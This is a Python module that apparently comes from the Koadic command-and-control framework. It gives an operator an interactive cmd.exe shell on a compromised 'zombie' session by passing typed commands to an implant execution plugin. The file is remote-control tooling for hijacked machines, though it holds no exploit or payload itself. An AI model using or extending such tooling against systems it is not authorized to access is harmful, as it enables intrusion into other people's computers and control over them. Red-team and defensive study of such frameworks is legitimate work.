DESCRIPTION = "command shell to interact with a zombie"

def autocomplete(shell, line, text, state):
    if len(line.split(" ")) >= 2:
        return None

    options = []

    for server in shell.stagers:
        for session in server.sessions:
            options.append(str(session.id))

    try:
        return options[state]
    except:
        return None

def help(shell):
    pass

def get_prompt(shell, id, ip, isreadline = True):
        return "%s%s: %s%s" % (shell.colors.colorize("[", [shell.colors.NORMAL], isreadline),
                                 shell.colors.colorize("koadic", [shell.colors.BOLD], isreadline),
                                 shell.colors.colorize("ZOMBIE %s (%s)" % (id, ip), [shell.colors.CYAN], isreadline),
                                 shell.colors.colorize(" - cmd.exe]> ", [shell.colors.NORMAL], isreadline))

def run_cmdshell(shell, session):
    import copy

    exec_cmd_name = 'implant/manage/exec_cmd'
    # this won't work, Error: "can't pickle module objects"
    #plugin = copy.deepcopy(shell.plugins['implant/manage/exec_cmd'])
    plugin = shell.plugins[exec_cmd_name]

    # copy (hacky shit)
    old_prompt = shell.prompt
    old_clean_prompt = shell.clean_prompt
    old_state = shell.state

    old_zombie = plugin.options.get("ZOMBIE")
    old_cmd = plugin.options.get("CMD")

    id = str(session.id)
    ip = session.ip

    while True:
        shell.state = exec_cmd_name
        shell.prompt = get_prompt(shell, id, ip, True)
        shell.clean_prompt = get_prompt(shell, id, ip, False)
        plugin.options.set("ZOMBIE", id)

        try:
            import readline
            readline.set_completer(None)
            cmd = shell.get_command(shell.prompt)

            if len(cmd) > 0:
                if cmd == 'exit':
                    return

                plugin.options.set("CMD", cmd)
                plugin.run()
        except KeyboardInterrupt:
            shell.print_plain(shell.prompt)
            return
        finally:
            plugin.options.set("ZOMBIE", old_zombie)
            plugin.options.set("cmd", old_cmd)

            shell.prompt = old_prompt
            shell.clean_prompt = old_clean_prompt
            shell.state = old_state


def execute(shell, cmd):
    splitted = cmd.split(" ")
    if len(splitted) >= 2:
        target = splitted[1]

        for server in shell.stagers:
            for session in server.sessions:
                if target == str(session.id):
                    run_cmdshell(shell, session)
                    return

        shell.print_error("Zombie #%s not found." % (target))
    else:
        shell.print_error("You must provide a zombie number as an argument.")
